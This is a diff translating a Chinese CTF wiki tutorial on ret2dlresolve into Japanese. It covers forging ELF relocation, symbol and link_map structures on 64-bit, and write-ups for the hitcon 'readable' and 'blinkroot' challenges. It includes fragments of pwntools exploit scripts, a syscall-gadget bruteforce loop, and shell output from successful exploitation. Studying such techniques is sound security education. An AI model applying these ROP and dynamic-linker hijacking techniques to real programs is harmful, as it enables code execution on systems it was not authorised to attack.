 ```shell
 ❯ gcc -fno-stack-protector -z relro  -no-pie ../../main.c -o main_partial_relro_64
@@ -1732,17 +1732,17 @@ io.interactive()
     PIE:      No PIE (0x400000)
 ```
 
-这里我们仍然以手工构造和基于工具构造两种方式来介绍 64 位下的 ret2dlresolve。
+ここでも、手作業での構築とツールを使った構築の2通りで、64 ビットでの ret2dlresolve を紹介します。
 
-#### 手工伪造
+#### 手作業での偽造
 
-这里我们就不一步步展示了。直接采用最终的思路。
+ここでは一歩ずつは示さず、最終的な方針を直接採用します。
 
-##### 64 位的变化
+##### 64 ビットでの変更点
 
-首先，我们先来看一下 64 位中的一些变化。
+まず、64 ビットでのいくつかの変更点を見てみましょう。
 
-glibc 中默认编译使用的是 `ELF_Rela` 来记录重定位项的内容
+glibc ではデフォルトのコンパイルで、リロケーション項の内容の記録に `ELF_Rela` が使われます。
 
 ```c
 typedef struct
@@ -1757,9 +1757,9 @@ typedef struct
 #define ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) << 32) + (type))
 ```
 
-这里 Elf64_Addr、Elf64_Xword、Elf64_Sxword 都为 64 位，因此 Elf64_Rela 结构体的大小为 24 字节。
+ここで Elf64_Addr、Elf64_Xword、Elf64_Sxword はいずれも 64 ビットなので、Elf64_Rela 構造体のサイズは 24 バイトです。
 
-根据 IDA 里的重定位表的信息可以知道，write 函数在符号表中的偏移为 1（0x100000007h>>32） 。
+IDA のリロケーションテーブルの情報から、write 関数のシンボルテーブル中でのオフセットは 1 (0x100000007h>>32) であることが分かります。
 
 ```assembly
 LOAD:0000000000400488 ; ELF JMPREL Relocation Table
@@ -1770,7 +1770,7 @@ LOAD:00000000004004D0                 Elf64_Rela <601030h, 400000007h, 0> ; R_X8
 LOAD:00000000004004D0 LOAD            ends
 ```
 
-确实在符号表中的偏移为 1。
+確かにシンボルテーブル中でのオフセットは 1 です。
 
 ```shell
 LOAD:00000000004002C0 ; ELF Symbol Table
@@ -1782,7 +1782,7 @@ LOAD:0000000000400320      Elf64_Sym <offset aRead - offset byte_400398, 12h, 0,
 ...
 ```
 
-在 64 位下，Elf64_Sym 结构体为
+64 ビットでは、Elf64_Sym 構造体は次のとおりです。
 
 ```c
 typedef struct
@@ -1796,16 +1796,16 @@ typedef struct
 } Elf64_Sym;
 ```
 
-其中
+ここで、
 
-- Elf64_Word 32 位
-- Elf64_Section 16 位
-- Elf64_Addr 64 位
-- Elf64_Xword 64位
+- Elf64_Word は 32 ビット
+- Elf64_Section は 16 ビット
+- Elf64_Addr は 64 ビット
+- Elf64_Xword は 64 ビット
 
-所以，Elf64_Sym 的大小为 24 个字节。
+したがって、Elf64_Sym のサイズは 24 バイトです。
 
-除此之外，在 64 位下，plt 中的代码 push 的是待解析符号在重定位表中的索引，而不是偏移。比如，write 函数 push 的是 0。
+このほか、64 ビットでは、plt 中のコードが push するのは、解決対象のシンボルのリロケーションテーブル中でのオフセットではなくインデックスです。たとえば、write 関数が push するのは 0 です。
 
 ```assembly
 .plt:0000000000400510 ; ssize_t write(int fd, const void *buf, size_t n)
@@ -1820,7 +1820,7 @@ typedef struct
 
 ##### First Try - leak
 
-根据上述的分析，我们可以写出如下脚本
+上の分析に基づいて、次のようなスクリプトを書けます。
 
 ```python
 from pwn import *
@@ -1929,7 +1929,7 @@ io.send(rop.chain())
 io.interactive()
 ```
 
-然而， 简单地运行后发现，程序崩溃了。
+しかし、簡単に実行してみると、プログラムがクラッシュしました。
 
 ```
 ─────────────────────────────────[ REGISTERS ]──────────────────────────────────
@@ -1964,12 +1964,12 @@ io.interactive()
    0x7fe00ad7eee4 <_dl_fixup+164>    test   edx, edx
 ```
 
-通过调试，我们发现，程序是在获取对应的版本号
+デバッグにより、プログラムが対応するバージョン番号を取得するところ
 
-- rax 为 0x4003f6，指向版本号数组
-- rdx 为 0x155f1，符号表索引，同时为版本号索引
+- rax は 0x4003f6 で、バージョン番号の配列を指している
+- rdx は 0x155f1 で、シンボルテーブルのインデックスであり、同時にバージョン番号のインデックスでもある
 
-同时 rax + rdx*2 为 0x42afd8，而这个地址并不在映射的内存中。
+同時に rax + rdx*2 は 0x42afd8 で、このアドレスはマップされたメモリ内にありません。
 
 ```
 pwndbg> print /x $rax + $rdx*2
@@ -1995,15 +1995,15 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
 ```
 
-那我们能不能想办法让它位于映射的内存中呢。估计有点难
+では、これをマップされたメモリ内に入れる方法はないでしょうか。おそらく少し難しいでしょう。
 
-- bss 的起始地址为 0x601050，那么索引值最小为 (0x601050-0x400398)/24=87517，即 0x4003f6 + 87517*2 = 0x42afb0
-- bss 可以最大使用的地址为 0x601fff，对应的索引值为(0x601fff-0x400398)/24=87684，即0x4003f6 + 87684*2 = 0x42b0fe
+- bss の開始アドレスは 0x601050 なので、インデックス値の最小は (0x601050-0x400398)/24=87517、つまり 0x4003f6 + 87517*2 = 0x42afb0
+- bss で使用できる最大のアドレスは 0x601fff で、対応するインデックス値は (0x601fff-0x400398)/24=87684、つまり 0x4003f6 + 87684*2 = 0x42b0fe
 
-显然都在非映射的内存区域。因此，我们得考虑考虑其它办法。通过阅读 dl_fixup 的代码
+いずれも明らかにマップされていないメモリ領域です。そのため、ほかの方法を考える必要があります。dl_fixup のコードを読むと、
 
 ```c
-        // 获取符号的版本信息
+        // シンボルのバージョン情報を取得する
         const struct r_found_version *version = NULL;
         if (l->l_info[VERSYMIDX(DT_VERSYM)] != NULL)
         {
@@ -2015,15 +2015,15 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
         }
 ```
 
-我们发现，如果把 l->l_info[VERSYMIDX(DT_VERSYM)] 设置为 NULL，那程序就不会执行下面的代码，版本号就为 NULL，就可以正常执行代码。但是，这样的话，我们就需要知道 link_map 的地址了。 GOT 表的第 0 项（本例中 0x601008）存储的就是 link_map 的地址。
+l->l_info[VERSYMIDX(DT_VERSYM)] を NULL に設定すれば、プログラムは下のコードを実行せず、バージョン番号が NULL になり、コードを正常に実行できることが分かります。ただし、そのためには link_map のアドレスを知る必要があります。GOT テーブルの第0項(この例では 0x601008)に格納されているのが link_map のアドレスです。
 
-因此，我们可以
+そこで、次のようにできます。
 
-- 泄露该处的地址
-- 将 l->l_info[VERSYMIDX(DT_VERSYM)] 设置为 NULL
-- 最后执行利用脚本即可
+- そのアドレスを leak する
+- l->l_info[VERSYMIDX(DT_VERSYM)] を NULL に設定する
+- 最後に悪用スクリプトを実行する
 
-通过汇编代码，我们可以看出 l->l_info[VERSYMIDX(DT_VERSYM)] 的偏移为 0x1c8
+アセンブリコードから、l->l_info[VERSYMIDX(DT_VERSYM)] のオフセットが 0x1c8 であることが分かります。
 
 ```assembly
  ► 0x7fa4b09f7ea1 <_dl_fixup+97>     mov    rax, qword ptr [r10 + 0x1c8]
@@ -2032,7 +2032,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x7fa4b09f7eae <_dl_fixup+110>    je     _dl_fixup+156 <_dl_fixup+156>
 ```
 
-因此，我们可以简单修改下 exp。
+そこで、exp を少し修正します。
 
 ```python
 from pwn import *
@@ -2163,7 +2163,7 @@ io.send(rop.chain())
 io.interactive()
 ```
 
-然鹅，还是崩溃。但这次比较好的是，确实已经执行到了 system 函数。通过调试，我们可以发现，system 函数在进一步调用 execve 时出现了问题
+ところが、まだクラッシュします。ただし今回は、実際に system 関数まで実行できているのは良い点です。デバッグすると、system 関数がさらに execve を呼び出すところで問題が起きていることが分かります。
 
 ```assembly
  ► 0x7f7f3f74d3ec <do_system+1180>       call   execve <execve>
@@ -2172,9 +2172,9 @@ io.interactive()
         envp: 0x7ffe636770a8 ◂— 0x10000
 ```
 
-即环境变量的地址指向了一个莫名的地址，这应该是我们在进行 ROP 的时候破坏了栈上的数据。那我们可以调整调整，使其为 NULL 或者尽可能不破坏原有的数据。这里我们选择使其为 NULL。
+つまり、環境変数のアドレスがわけの分からないアドレスを指しています。これはおそらく、ROP を行うときにスタック上のデータを破壊してしまったためです。そこで、調整して NULL にするか、できるだけ元のデータを破壊しないようにします。ここでは NULL にすることにします。
 
-首先，我们可以把读伪造的数据和 /bin/sh 部分的 rop 合并起来，以减少 ROP 的次数
+まず、偽造データを読み込む部分と /bin/sh の部分の rop をまとめて、ROP の回数を減らします。
 
 ```python
 from pwn import *
@@ -2308,7 +2308,7 @@ io.send(rop.chain())
 io.interactive()
 ```
 
-这时，再次尝试一下，发现
+ここでもう一度試すと、次のようになります。
 
 ```assembly
  ► 0x7f5a187703ec <do_system+1180>       call   execve <execve>
@@ -2317,7 +2317,7 @@ io.interactive()
         envp: 0x7fff68270538 ◂— 0x6161616100000000
 ```
 
-这时候 envp 被污染的数据就只有 0x61 了，即我们填充的数据 'a'。那就好办了，我们只需要把所有的 pad 都替换为 `\x00` 即可。
+このとき envp の汚染されたデータは 0x61、つまり私たちが埋めたデータ 'a' だけになりました。それなら簡単で、すべての pad を `\x00` に置き換えればよいだけです。
 
 ```python
 from pwn import *
@@ -2451,7 +2451,7 @@ io.send(rop.chain())
 io.interactive()
 ```
 
-这时候即可利用成功
+これで悪用に成功します。
 
 ```shell
 ❯ python exp-manual4.py
@@ -2473,15 +2473,15 @@ iromise
 
 ##### Second try - no leak
 
-可以看出，在上面的测试中，我们仍然利用 write 函数泄露了 link_map 的地址，那么，如果程序中没有输出函数，我们是否还能够发起利用呢？答案是可以的。我们再来看一下 `_dl_fix_up` 的实现
+上のテストでは、やはり write 関数を使って link_map のアドレスを leak しました。では、プログラムに出力関数がない場合でも、悪用できるでしょうか。答えは可能です。`_dl_fix_up` の実装をもう一度見てみましょう。
 
 ```c
     /* Look up the target symbol.  If the normal lookup rules are not
       used don't look in the global scope.  */
-    // 判断符号的可见性
+    // シンボルの可視性を判定する
     if (__builtin_expect(ELFW(ST_VISIBILITY)(sym->st_other), 0) == 0)
     {
-        // 获取符号的版本信息
+        // シンボルのバージョン情報を取得する
         const struct r_found_version *version = NULL;
         if (l->l_info[VERSYMIDX(DT_VERSYM)] != NULL)
         {
@@ -2503,7 +2503,7 @@ iromise
 #ifdef RTLD_ENABLE_FOREIGN_CALL
         RTLD_ENABLE_FOREIGN_CALL;
 #endif
-        // 查询待解析符号所在的目标文件的 link_map
+        // 解決対象のシンボルが存在するオブジェクトファイルの link_map を検索する
         result = _dl_lookup_symbol_x(strtab + sym->st_name, l, &sym, l->l_scope,
                                      version, ELF_RTYPE_CLASS_PLT, flags, NULL);
         /* We are done with the global scope.  */
@@ -2515,8 +2515,8 @@ iromise
         /* Currently result contains the base load address (or link map)
          of the object that defines sym.  Now add in the symbol
          offset.  */
-        // 基于查询到的 link_map 计算符号的绝对地址: result->l_addr + sym->st_value
-        // l_addr 为待解析函数所在文件的基地址
+        // 検索した link_map に基づいてシンボルの絶対アドレスを計算する: result->l_addr + sym->st_value
+        // l_addr は、解決対象の関数が存在するファイルのベースアドレス
         value = DL_FIXUP_MAKE_VALUE(result,
                                     SYMBOL_ADDRESS(result, sym, false));
     }
@@ -2529,7 +2529,7 @@ iromise
     }
 ```
 
-如果我们故意将 __builtin_expect(ELFW(ST_VISIBILITY)(sym->st_other), 0) 设置为 0，那么程序就会执行 else 分支。具体的，我们设置 sym->st_other 不为 0 即可满足这一条件。
+__builtin_expect(ELFW(ST_VISIBILITY)(sym->st_other), 0) を 0 に設定する(つまり条件が成り立たないようにする)と、プログラムは else 分岐を実行します。具体的には、sym->st_other を 0 以外にすればこの条件を満たせます。
 
 ```c
 /* How to extract and insert information held in the st_other field.  */
@@ -2543,18 +2543,18 @@ iromise
 #define STV_PROTECTED        3                /* Not preemptible, not exported */
 ```
 
-此时程序计算 value 的方式为
+このときプログラムが value を計算する方法は次のとおりです。
 
 ```
 value = l->l_addr + sym->st_value
 ```
 
-通过查看 link_map 结构体的[定义](https://code.woboq.org/userspace/glibc/include/link.h.html#link_map)，可以知道 l_addr 是 link_map 的第一个成员，那么如果我们伪造上述这两个变量，并借助于已有的被解析的函数地址，比如
+link_map 構造体の[定義](https://code.woboq.org/userspace/glibc/include/link.h.html#link_map)を見ると、l_addr が link_map の最初のメンバであることが分かります。そこで、この2つの変数を偽造し、すでに解決された関数のアドレスを借りれば、たとえば次のようにできます。
 
-- 伪造 link_map->l_addr 为已解析函数与想要执行的目标函数的偏移值，如 addr_system-addr_xxx 
-- 伪造 sym->st_value 为已经解析过的某个函数的 got 表的位置，即相当于有了一个隐式的信息泄露
+- link_map->l_addr を、解決済みの関数と実行したい目的の関数とのオフセット値、たとえば addr_system-addr_xxx に偽造する
+- sym->st_value を、すでに解決済みのある関数の got テーブル上の位置に偽造する。これは暗黙の情報 leak を得たのと同じことになる
 
-那就可以得到对应的目标地址。
+すると、対応する目的のアドレスを得られます。
 
 ```c
 struct link_map
@@ -2593,7 +2593,7 @@ struct link_map
                       + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];
 ```
 
-一般而言，至少有 __libc_start_main 已经解析过了。本例中，显然不止这一个函数。
+一般に、少なくとも __libc_start_main は解決済みです。この例では、明らかにこの関数だけではありません。
 
 ```
 .got:0000000000600FF0 ; ===========================================================================
@@ -2629,9 +2629,9 @@ struct link_map
 .got.plt:0000000000601030
 ```
 
-与此同时，通过阅读 `_dl_fixup` 函数的代码，在设置  `__builtin_expect(ELFW(ST_VISIBILITY)(sym->st_other), 0)` 为 0 后，我们可以发现，该函数主要依赖了 link_map 中 l_info 的内容。因此，我们同样需要伪造该部分所需要的内容。
+同時に、`_dl_fixup` 関数のコードを読むと、`__builtin_expect(ELFW(ST_VISIBILITY)(sym->st_other), 0)` を 0 に設定した後、この関数は主に link_map 中の l_info の内容に依存していることが分かります。したがって、その部分に必要な内容も偽造する必要があります。
 
-利用代码如下
+悪用コードは次のとおりです。
 
 ```python
 from pwn import *
@@ -2755,7 +2755,7 @@ io.send(rop.chain())
 io.interactive()
 ```
 
-最终执行结果
+最終的な実行結果
 
 ```shell
 ❯ python exp-fake-linkmap.py
@@ -2780,17 +2780,17 @@ $ whoami
 iromise
 ```
 
-虽然在这样的攻击中，我们不再需要信息泄露，但是我们需要知道目标机器的 libc，更具体的，我们需要知道目标函数和某个已经解析后的函数之间的偏移。
+このような攻撃では情報 leak は不要になりますが、対象マシンの libc を知っている必要があります。より具体的には、目的の関数と、すでに解決済みのある関数との間のオフセットを知る必要があります。
 
-#### 基于工具伪造
+#### ツールによる偽造
 
-感兴趣的读者可以自行尝试使用相关的工具看是否可以攻击成功。
+興味のある読者は、関連するツールで攻撃に成功するかどうかを自分で試してみてください。
 
 ### Full RELRO
 
 ## 2015-hitcon-readable
 
-检查一下文件权限，可以发现，该可执行文件只开启了 NX 保护
+ファイルの権限を確認すると、この実行可能ファイルでは NX 保護のみが有効になっていることが分かります。
 
 ```bash
 ❯ checksec readable
@@ -2802,9 +2802,9 @@ iromise
     PIE:      No PIE (0x400000)
 ```
 
-也就是说我们其实可以直接修改 dynamic 节的内容。但是，与 2015-xdctf-pwn200 不同，这里栈溢出只能越界读取 16 个字节，而上述例子中所使用的的 ret2csu 则需要大量的字节。因此，直接使用该方法是不行了。
+つまり、dynamic セクションの内容を直接書き換えられます。ただし 2015-xdctf-pwn200 とは異なり、ここではスタックオーバーフローで範囲外を読み取れるのは 16 バイトだけですが、上の例で使った ret2csu には大量のバイトが必要です。そのため、この方法をそのまま使うことはできません。
 
-我们来仔细分析下目前的情况，即我们可以越界控制 rbp、返回地址。考虑到 read 是使用 rbp 来索引 buffer 的
+現在の状況を詳しく分析してみましょう。rbp とリターンアドレスを範囲外で制御できます。read が rbp を使って buffer を索引することを考えると、
 
 ```
 .text:0000000000400505                 lea     rax, [rbp-10h]
@@ -2817,7 +2817,7 @@ iromise
 .text:0000000000400521                 retn
 ```
 
-那如果我们控制 rbp 为写的地址加上 0x10，即 targetaddr+0x10，然后再跳转到 0x400505，即栈的结构为
+rbp を書き込み先のアドレス+0x10、つまり targetaddr+0x10 に制御し、さらに 0x400505 にジャンプするようにします。つまりスタックの構造は次のとおりです。
 
 ```
 return_addr -> 0x400505
@@ -2825,9 +2825,9 @@ rbp         -> target addr + 0x10
 fake buf
 ```
 
-那么我们就可以控制程序在目标地址处写 16 个字节。通过不断地这样操作，我们就可以不断地读取 16 个字节，从而达到读取任意长字节的目的。
+すると、プログラムが目的のアドレスに 16 バイトを書き込むように制御できます。この操作を繰り返し行うことで、16 バイトずつ読み込み続けられ、任意の長さのバイトを読み込む目的を達成できます。
 
-### 方法1：modify dynamic section
+### 方法1: modify dynamic section
 
 ```python
 from pwn import *
@@ -2902,11 +2902,11 @@ io.send("/bin/sh\x00")
 io.interactive()
 ```
 
-### 方法 2 - 标准 ROP
+### 方法 2 - 標準 ROP
 
-这个方法比较取巧，考虑到 read 函数很短，而且最后会调用系统调用，因此在 libc 的实现中会使用 syscall 指令，而同时我们可以修改 read 的 got 表，那如果我们把 read@got.plt 修改为 syscall 的地址，同时布置好相关的参数，即可执行系统调用。这里我们控制 ROP 执行`execve("/bin/sh",NULL,NULL)`。
+この方法は少し巧妙です。read 関数は短く、最後にシステムコールを呼び出すため、libc の実装には syscall 命令が使われています。同時に read の got テーブルを書き換えられるので、read@got.plt を syscall のアドレスに書き換え、関連する引数を用意すれば、システムコールを実行できます。ここでは ROP で `execve("/bin/sh",NULL,NULL)` を実行するように制御します。
 
-首先，我们需要爆破来寻找 syscall 具体的地址，我们可以考虑调用 write 函数来看是否真正执行了 syscall指令
+まず、syscall の具体的なアドレスをブルートフォースで探す必要があります。write 関数を呼び出して、本当に syscall 命令が実行されたかを確認することを考えます。
 
 ```
 def bruteforce():
@@ -2939,7 +2939,7 @@ def bruteforce():
         io.close()
 ```
 
-即我们控制程序输出 ELF 文件的头，如果输出了，那就说明成功了。此外，这里我们使用了read 函数的返回值来控制 rax 寄存器的值，以便于控制具体想要执行哪个系统调用。运行结果如下
+つまり、プログラムに ELF ファイルのヘッダを出力させます。出力されれば成功です。また、ここでは read 関数の戻り値を使って rax レジスタの値を制御し、どのシステムコールを実行するかを制御しています。実行結果は次のとおりです。
 
 ```bash
 ❯ python exp.py
@@ -2947,23 +2947,23 @@ def bruteforce():
 ('0xc2', '\x7fELF')
 ```
 
-通过对比 libc.so 确实可以看到，对应的偏移处具有 `syscall` 指令
+libc.so と比較すると、確かに対応するオフセットに `syscall` 命令があることが分かります。
 
 ```
 .text:000000000011018F                 syscall                 ; LINUX - sys_read
 .text:00000000001101C2                 syscall                 ; LINUX - sys_read
 ```
 
-libc 的版本为
+libc のバージョンは次のとおりです。
 
 ```
 ❯ ./libc.so.6
 GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.
 ```
 
-需要注意，不同 libc 的偏移可能不一样。
+なお、libc によってオフセットが異なる場合があります。
 
-完整代码如下
+完全なコードは次のとおりです。
 
 ```python
 from pwn import *
@@ -3056,7 +3056,7 @@ if __name__ == "__main__":
 
 ## 2015-hitcon-quals-blinkroot
 
-简单看一下程序开的保护
+プログラムの保護機構を簡単に見てみましょう。
 
 ```bash
 ❯ checksec blinkroot
@@ -3068,15 +3068,15 @@ if __name__ == "__main__":
     PIE:      No PIE (0x400000)
 ```
 
-发现程序开启了 Canary 保护。
+プログラムで Canary 保護が有効になっていることが分かります。
 
-程序的基本逻辑为
+プログラムの基本的なロジックは次のとおりです。
 
-- 在 bss 指定位置处读取 1024 个字节
-- 关闭标准输入，标准输出，标准错误输出。
-- 然后可以在任意 16 字节对齐地址处设置16个字节，其中低8字节固定为 0x10，高 8 字节完全可控。
+- bss の指定位置に 1024 バイトを読み込む
+- 標準入力、標準出力、標準エラー出力を閉じる。
+- その後、任意の 16 バイトアラインされたアドレスに 16 バイトを設定できる。そのうち下位 8 バイトは 0x10 に固定で、上位 8 バイトは完全に制御できる。
 
-显然这里是没有信息泄露的，当然我们没有办法覆盖返回地址来控制程序的执行流。但是既然程序没有开启 RELRO 保护，我们可以考虑修改 ELF 文件的字符串表。同时我们观察到
+明らかにここでは情報 leak はなく、リターンアドレスを上書きしてプログラムの実行フローを制御することもできません。しかしプログラムには RELRO 保護が有効になっていないので、ELF ファイルの文字列テーブルを書き換えることを考えられます。同時に、次の点に気づきます。
 
 ```c
 int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
@@ -3093,7 +3093,7 @@ int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
 }
 ```
 
-程序会执行 puts 函数，而 puts 函数的具体地址为 data 变量偏移 0x10。
+プログラムは puts 関数を実行し、puts 関数の具体的なアドレスは data 変数のオフセット 0x10 にあります。
 
 ```
 .bss:0000000000600BC0                 public data
@@ -3106,7 +3106,7 @@ int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
 .bss:0000000000600BD0 _bss            ends
 ```
 
-因此，我们可以控制 s 为 /bin/sh，同时控制字符串表中的 puts 函数为 system 函数，那就可以调用 system 函数了。然而，理想很好，但是，我们发现
+そこで、s を /bin/sh に、文字列テーブル中の puts 関数を system 関数に制御すれば、system 関数を呼び出せます。ところが、理想は良いものの、次のことに気づきます。
 
 ```
 LOAD:00000000006009E8                 Elf64_Dyn <5, 400340h>  ; DT_STRTAB
@@ -3114,21 +3114,21 @@ LOAD:00000000006009F8                 Elf64_Dyn <6, 400280h>  ; DT_SYMTAB
 LOAD:0000000000600A08                 Elf64_Dyn <0Ah, 69h>    ; DT_STRSZ
 ```
 
-字符串表并不是 16 字节对齐的，因此不太行。那我们尝试使用在开启 Partial RELRO 下的思路吧。
+文字列テーブルは 16 バイトアラインされていないため、これは使えません。そこで、Partial RELRO が有効な場合の方針を試してみましょう。
 
-由于不能泄露地址信息，所以我们可以采用伪造 linkmap 的思路，即
+アドレス情報を leak できないので、linkmap を偽造する方針をとります。つまり、
 
-- 利用题目提供的任意写的思路修改 linkmap 指向已经解析的地址
-- 通过题目中接下来将要调用的 puts 函数来实现劫持控制流的目的
+- 問題が提供する任意書き込みを利用して、linkmap が解決済みのアドレスを指すように書き換える
+- 問題中でこの後呼び出される puts 関数を通じて、制御フローを乗っ取る目的を達成する
 
-这里我们可以发现 linkmap 存储的地址为 0x600B48，因此我们可以从 0x600B40 开始设置数据。
+linkmap が格納されているアドレスは 0x600B48 であることが分かるので、0x600B40 からデータを設定できます。
 
 ```assembly
 .got.plt:0000000000600B40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
 .got.plt:0000000000600B48 qword_600B48    dq 0                    ; DATA XREF: sub_4004D0↑r
 ```
 
-此外，需要注意的是 puts 函数在重定位表中的索引为 1。因此，在构造 linkmap 时需要注意。
+また、puts 関数のリロケーションテーブル中でのインデックスは 1 であることに注意が必要です。そのため、linkmap を構築するときに気をつける必要があります。
 
 ```assembly
 .plt:00000000004004F0 ; int puts(const char *s)
@@ -3141,7 +3141,7 @@ LOAD:0000000000600A08                 Elf64_Dyn <0Ah, 69h>    ; DT_STRSZ
 .plt:00000000004004FB                 jmp     sub_4004D0
 ```
 
-利用脚本如下
+悪用スクリプトは次のとおりです。
 
 ```python
 from pwn import *
@@ -3230,22 +3230,22 @@ io.send(payload)
 io.interactive()
 ```
 
-需要注意这里的 `data_addr+43` 为伪造的 linkmap 的地址。执行效果如下
+ここでの `data_addr+43` が偽造した linkmap のアドレスであることに注意してください。実行結果は次のとおりです。
 
 ```
 ❯ nc -l 127.0.0.1 8080
 iromise
 ```
 
-上面的这种方式为伪造 link_map 的 l_addr 为目标函数和已解析函数之间的偏移。
+上の方法は、link_map の l_addr を、目的の関数と解決済みの関数との間のオフセットに偽造するものです。
 
-根据之前的介绍，我们还可以伪造 l_addr 为已解析函数的地址， st_value 为已解析函数和目标函数之间的偏移。
+前述のとおり、l_addr を解決済みの関数のアドレスに、st_value を解決済みの関数と目的の関数との間のオフセットに偽造することもできます。
 
 ```
 value = l->l_addr + sym->st_value
 ```
 
-这里，由于 `.got.plt` 的下方没多远就是 bss 段 data 的位置。当我们控制 linkmap 的地址位于 got 表附近时，同时我们还需要利用 link_map 的几个动态表指针，偏移从 0x68 开始。因此我们需要仔细构造对应的数据。这里我们选择伪造 link_map 到 0x600B80。
+ここで、`.got.plt` のすぐ下のあたりに bss セクションの data の位置があります。linkmap のアドレスを got テーブルの近くにする場合、link_map のいくつかの動的テーブルポインタ(オフセットは 0x68 から始まる)も利用する必要があります。そのため、対応するデータを慎重に構築する必要があります。ここでは link_map を 0x600B80 に偽造することにします。
 
 ```
 0x600B80-->link_map
@@ -3255,7 +3255,7 @@ value = l->l_addr + sym->st_value
 0x600BE8-->data+24
 ```
 
-因此，我们可以控制的 puts 的参数的长度最大为 0x18。
+したがって、制御できる puts の引数の長さは最大 0x18 です。
 
 ```python
 from pwn import *
@@ -3340,31 +3340,31 @@ io.send(payload)
 io.interactive()
 ```
 
-需要注意的是，在伪造 linkmap  的时候，我们是从偏移 0x68 开始构造的，所以在最后对齐的时候设置 `linkmap.ljust(0xf8-0x68, 'A')`。
+なお、linkmap を偽造するときは、オフセット 0x68 から構築したので、最後のアラインのときに `linkmap.ljust(0xf8-0x68, 'A')` と設定していることに注意してください。
 
-执行效果
+実行結果
 
 ```shell
 ❯ nc -l 127.0.0.1 8080
 uid=1000(iromise) gid=1000(iromise)...
 ```
 
-## 总结
+## まとめ
 
-|              | 修改 dynamic 节的内容 | 修改重定位表项的位置                                         | 伪造 linkmap                                         |
+|              | dynamic セクションの内容の書き換え | リロケーションテーブルのエントリの位置の書き換え | linkmap の偽造 |
 | ------------ | --------------------- | ------------------------------------------------------------ | ---------------------------------------------------- |
-| 主要前提要求 | 无                    | 无                                                           | 无信息泄漏时需要 libc                                |
-| 适用情况     | NO RELRO              | NO RELRO, Partial RELRO                                      | NO RELRO, Partial RELRO                              |
-| 注意点       |                       | 确保版本检查通过；确保重定位位置可写；确保重定位表项、符号表、字符串表一一对应 | 确保重定位位置可写；需要着重伪造重定位表项、符号表； |
+| 主要な前提条件 | なし                    | なし                                                           | 情報 leak がない場合は libc が必要                                |
+| 適用状況     | NO RELRO              | NO RELRO, Partial RELRO                                      | NO RELRO, Partial RELRO                              |
+| 注意点       |                       | バージョンチェックを通過させること、リロケーション先が書き込み可能であること、リロケーションテーブルのエントリ・シンボルテーブル・文字列テーブルが一対一で対応していること | リロケーション先が書き込み可能であること、リロケーションテーブルのエントリとシンボルテーブルを重点的に偽造する必要があること |
 
-总的来说，与 ret2dlresolve 攻击最为相关的一些动态节为
+全体として、ret2dlresolve 攻撃に最も関連する動的セクションは次のとおりです。
 
 - DT_JMPREL
 - DT_SYMTAB
 - DT_STRTAB
 - DT_VERSYM
 
-## 题目
+## 問題
 
 - pwnable.kr unexploitable
 - pwnable.tw unexploitable
@@ -3373,7 +3373,7 @@ uid=1000(iromise) gid=1000(iromise)...
 
 ## 参考
 
-1. http://pwn4.fun/2016/11/09/Return-to-dl-resolve/ ，深入浅出。
+1. http://pwn4.fun/2016/11/09/Return-to-dl-resolve/ 、分かりやすく掘り下げた解説です。
 2. https://www.math1as.com/index.php/archives/341/
 3. https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/
 4. https://blog.csdn.net/seaaseesa/article/details/104478081
